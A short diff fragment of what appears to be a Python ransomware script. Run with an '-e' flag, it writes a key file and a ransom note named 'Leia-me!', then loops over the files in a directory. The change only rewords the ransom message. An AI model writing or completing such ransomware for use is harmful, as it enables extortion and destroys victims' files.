@@ -53,7 +53,7 @@ with open('key.txt', 'w') as w:
 if (sys.argv[1:] == '-e'):
 
 	arq = open('Leia-me!', 'w') 
-	arq.write('OOOOPS!!! Your files are all encrypted! \n')
+	arq.write('OOOOPS!!! Your files has been encrypted! \n')
 	arq.close()
 
 	for files in os.listdir(diretorio):
